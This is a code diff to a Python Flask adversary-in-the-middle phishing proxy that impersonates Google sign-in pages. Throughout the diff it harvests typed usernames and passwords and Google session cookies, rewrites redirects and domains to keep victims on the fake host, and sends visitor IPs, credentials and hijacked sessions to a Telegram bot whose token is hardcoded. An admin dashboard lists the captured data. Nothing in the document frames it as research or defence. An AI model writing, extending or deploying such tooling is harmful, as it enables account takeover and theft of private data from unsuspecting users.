@@ -6,11 +6,10 @@ from datetime import datetime
 import os
 import urllib3
 import re
-from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Telegram settings
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
 
@@ -39,11 +38,7 @@ class PhishletEngine:
             logging.error(f"Telegram error: {e}")
 
     def notify_visit(self, ip, ua):
-        msg = (
-            f"👀 <b>New Visitor</b>\n"
-            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
-            f"📱 <b>UA:</b> <code>{ua[:100]}</code>"
-        )
+        msg = f"👀 <b>New Visitor</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n📱 <b>UA:</b> <code>{ua[:100]}</code>"
         self.send_to_telegram(msg)
 
     def capture_creds(self, form_data):
@@ -54,25 +49,14 @@ class PhishletEngine:
         for key, value in form_data.items():
             if any(k in key.lower() for k in ['login', 'user', 'pass', 'email', 'mail', 'pwd', 'password']):
                 found[key] = value
-
         if found:
             cred_id = datetime.now().strftime("%y%m%d_%H%M%S")
-            cred_data = {
-                'site': self.name,
-                'credentials': found,
-                'timestamp': str(datetime.now()),
-                'ip': request.remote_addr,
-                'user_agent': request.headers.get('User-Agent')
+            captured_creds[cred_id] = {
+                'site': self.name, 'credentials': found, 'timestamp': str(datetime.now()),
+                'ip': request.remote_addr, 'user_agent': request.headers.get('User-Agent')
             }
-            captured_creds[cred_id] = cred_data
-
-            msg = (
-                f"🔐 <b>New Credentials Captured</b>\n"
-                f"🎯 <b>Target:</b> {self.name}\n"
-                f"🆔 <b>ID:</b> <code>{cred_id}</code>\n"
-                f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                f"📋 <b>Data:</b>\n<pre>{json.dumps(found, indent=2, ensure_ascii=False)}</pre>"
-            )
+            msg = (f"🔐 <b>New Credentials Captured</b>\n🎯 <b>Target:</b> {self.name}\n🆔 <b>ID:</b> <code>{cred_id}</code>\n"
+                   f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📋 <b>Data:</b>\n<pre>{json.dumps(found, indent=2, ensure_ascii=False)}</pre>")
             self.send_to_telegram(msg)
             logging.info(f"Credentials: {found}")
         return found
@@ -84,74 +68,59 @@ class PhishletEngine:
         else:
             for cookie in cookies_jar:
                 cookies_dict[cookie.name] = cookie.value
-
-        auth_indicators = ['SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID',
-                           '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token',
-                           'session', 'token', 'auth']
+        auth_indicators = ['SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID', '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token', 'session', 'token', 'auth']
         has_auth = any(k in cookies_dict for k in auth_indicators)
-
         if cookies_dict and has_auth:
             session_id = datetime.now().strftime("%y%m%d_%H%M%S")
-            session_data = {
-                'site': self.name,
-                'cookies': cookies_dict,
-                'timestamp': str(datetime.now()),
-                'ip': request.remote_addr,
-                'user_agent': request.headers.get('User-Agent')
+            captured_sessions[session_id] = {
+                'site': self.name, 'cookies': cookies_dict, 'timestamp': str(datetime.now()),
+                'ip': request.remote_addr, 'user_agent': request.headers.get('User-Agent')
             }
-            captured_sessions[session_id] = session_data
-
             sample_items = list(cookies_dict.items())[:10]
             cookie_sample = "\n".join([f"<code>{k}</code>: <code>{v[:50]}...</code>" for k, v in sample_items])
             if len(cookies_dict) > 10:
                 cookie_sample += f"\n... و {len(cookies_dict)-10} كوكيز أخرى"
-
-            msg = f"🔥 <b>Full Session Hijacked!</b>\n"
-            msg += f"🎯 <b>Service:</b> {self.name}\n"
-            msg += f"🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
-            msg += f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            msg += f"📦 <b>Total Cookies:</b> {len(cookies_dict)}\n"
+            msg = (f"🔥 <b>Full Session Hijacked!</b>\n🎯 <b>Service:</b> {self.name}\n🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
+                   f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📦 <b>Total Cookies:</b> {len(cookies_dict)}\n")
             if creds_data:
                 msg += f"🔐 <b>Credentials also captured!</b>\n"
-            msg += f"🍪 <b>Cookies (sample):</b>\n{cookie_sample}\n"
-            msg += f"🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard"
+            msg += f"🍪 <b>Cookies (sample):</b>\n{cookie_sample}\n🔗 <b>Dashboard:</b> https://{current_host}/admin/dashboard"
             self.send_to_telegram(msg)
             logging.info(f"Session {session_id} captured with {len(cookies_dict)} cookies")
             return session_id
         return None
 
-    def advanced_rewrite(self, content, content_type, current_host):
-        # تعديل بسيط: نستبدل فقط نطاق الهدف
-        if not any(t in content_type for t in ['html', 'javascript', 'text']):
-            return content
-        try:
-            decoded = content.decode('utf-8', errors='ignore')
-            # استبدال كل الروابط التي تحتوي على target_domain
-            decoded = decoded.replace(self.target_domain, current_host)
-            # أيضًا استبدال الروابط المطلقة
-            decoded = decoded.replace(f"https://{self.target_domain}", f"https://{current_host}")
-            decoded = decoded.replace(f"http://{self.target_domain}", f"https://{current_host}")
-            return decoded.encode('utf-8')
-        except Exception as e:
-            logging.error(f"Rewrite error: {e}")
-            return content
+    def rewrite_content(self, content, content_type, current_host):
+        """إعادة كتابة بسيطة: استبدال النطاق فقط دون تغيير المسارات"""
+        if 'text/html' in content_type or 'application/javascript' in content_type:
+            try:
+                if isinstance(content, bytes):
+                    content = content.decode('utf-8', errors='ignore')
+                # استبدال النطاق الأصلي بالنطاق الحالي
+                content = content.replace(f"https://{self.target_domain}", f"https://{current_host}")
+                content = content.replace(f"http://{self.target_domain}", f"https://{current_host}")
+                # أيضاً استبدال النطاقات الفرعية المحتملة
+                for proxy in self.proxy_hosts:
+                    orig_domain = f"{proxy['orig_sub']}.{self.target_domain}" if proxy['orig_sub'] else self.target_domain
+                    content = content.replace(orig_domain, current_host)
+                return content.encode('utf-8')
+            except Exception as e:
+                logging.error(f"Rewrite error: {e}")
+                return content
+        return content
 
 phishlet = PhishletEngine(
     name='Google',
     target_domain='accounts.google.com',
-    proxy_hosts=[],  # لا نحتاجها الآن
-    auth_tokens=[
-        'SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID',
-        '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token'
+    proxy_hosts=[
+        {'phish_sub': 'accounts', 'orig_sub': 'accounts', 'domain': 'google.com'},
+        {'phish_sub': 'myaccount', 'orig_sub': 'myaccount', 'domain': 'google.com'},
+        {'phish_sub': 'mail', 'orig_sub': 'mail', 'domain': 'google.com'},
+        {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'google.com'}
     ],
-    creds_fields=[
-        'identifier', 'credentials.passwd', 'email', 'password', 'Passwd', 'passwd'
-    ],
-    auth_urls=[
-        'https://myaccount.google.com',
-        'https://mail.google.com',
-        'https://accounts.google.com'
-    ]
+    auth_tokens=['SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID', '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token'],
+    creds_fields=['identifier', 'credentials.passwd', 'email', 'password', 'Passwd', 'passwd'],
+    auth_urls=['https://myaccount.google.com', 'https://mail.google.com', 'https://accounts.google.com']
 )
 
 @app.before_request
@@ -166,33 +135,20 @@ def check_visit():
 @app.route('/admin/dashboard')
 def admin_dashboard():
     try:
-        return render_template(
-            'dashboard.html',
-            sessions=captured_sessions,
-            creds=captured_creds,
-            bot_username='Amrsavebot'
-        )
+        return render_template('dashboard.html', sessions=captured_sessions, creds=captured_creds, bot_username='Amrsavebot')
     except Exception as e:
         return f"Dashboard Error: {str(e)}", 500
 
 @app.route('/admin/session/<session_id>')
 def get_session(session_id):
     if session_id in captured_sessions:
-        return make_response(
-            json.dumps(captured_sessions[session_id], indent=2, ensure_ascii=False),
-            200,
-            {'Content-Type': 'application/json; charset=utf-8'}
-        )
+        return make_response(json.dumps(captured_sessions[session_id], indent=2, ensure_ascii=False), 200, {'Content-Type': 'application/json; charset=utf-8'})
     return "Session not found", 404
 
 @app.route('/admin/cred/<cred_id>')
 def get_cred(cred_id):
     if cred_id in captured_creds:
-        return make_response(
-            json.dumps(captured_creds[cred_id], indent=2, ensure_ascii=False),
-            200,
-            {'Content-Type': 'application/json; charset=utf-8'}
-        )
+        return make_response(json.dumps(captured_creds[cred_id], indent=2, ensure_ascii=False), 200, {'Content-Type': 'application/json; charset=utf-8'})
     return "Credential not found", 404
 
 @app.route('/admin/clear')
@@ -207,16 +163,14 @@ def proxy(path):
     host = request.headers.get('Host', '').split(':')[0]
     engine = phishlet
 
-    # بناء URL الهدف
-    target_url = f"https://{engine.target_domain}/{path}"
-    logging.info(f"Proxying {request.method} {path} to {target_url}")
+    # بناء عنوان URL الهدف بشكل صحيح باستخدام urljoin
+    base_url = f"https://{engine.target_domain}"
+    target_url = urljoin(base_url, path)
+    # إذا كان هناك query string، نضيفها
+    if request.query_string:
+        target_url += '?' + request.query_string.decode('utf-8')
 
-    # إعداد الرؤوس
-    headers = {}
-    for k, v in request.headers:
-        if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']:
-            headers[k] = v
-
+    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
     headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     headers['Referer'] = f"https://{engine.target_domain}/"
 
@@ -236,34 +190,39 @@ def proxy(path):
             timeout=30
         )
 
-        # إعادة كتابة المحتوى
-        content = engine.advanced_rewrite(resp.content, resp.headers.get('Content-Type', ''), host)
+        # معالجة التوجيه (redirects)
+        if resp.status_code in [301, 302, 303, 307, 308]:
+            location = resp.headers.get('Location', '')
+            if location:
+                # استبدال النطاق الأصلي بالنطاق الحالي فقط
+                parsed = urlparse(location)
+                if engine.target_domain in parsed.netloc:
+                    new_location = location.replace(parsed.netloc, host)
+                else:
+                    new_location = location  # لا تغيير إذا كان النطاق مختلفاً
+                proxy_resp = make_response('', resp.status_code)
+                proxy_resp.headers['Location'] = new_location
+                # نقل الكوكيز
+                for cookie_name, cookie_value in resp.cookies.items():
+                    proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
+                if resp.cookies:
+                    engine.capture_full_session(resp.cookies, host, captured_creds_data)
+                return proxy_resp
+
+        # معالجة المحتوى العادي
+        content = engine.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
         proxy_resp = make_response(content)
         proxy_resp.status_code = resp.status_code
 
-        # نسخ الرؤوس
-        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding',
-                            'strict-transport-security', 'content-security-policy']
         for n, v in resp.headers.items():
-            if n.lower() not in excluded_headers:
+            if n.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'strict-transport-security', 'content-security-policy']:
                 proxy_resp.headers[n] = v
 
-        # نقل الكوكيز
         for cookie_name, cookie_value in resp.cookies.items():
-            proxy_resp.set_cookie(
-                cookie_name, cookie_value,
-                domain=host, secure=True, httponly=True, samesite='Lax'
-            )
+            proxy_resp.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
 
-        # التقاط الجلسة إذا وجدت
         if resp.cookies:
             engine.capture_full_session(resp.cookies, host, captured_creds_data)
-
-        # تعديل التوجيه
-        if 'Location' in proxy_resp.headers:
-            location = proxy_resp.headers['Location']
-            new_location = location.replace(engine.target_domain, host)
-            proxy_resp.headers['Location'] = new_location
 
         return proxy_resp
 
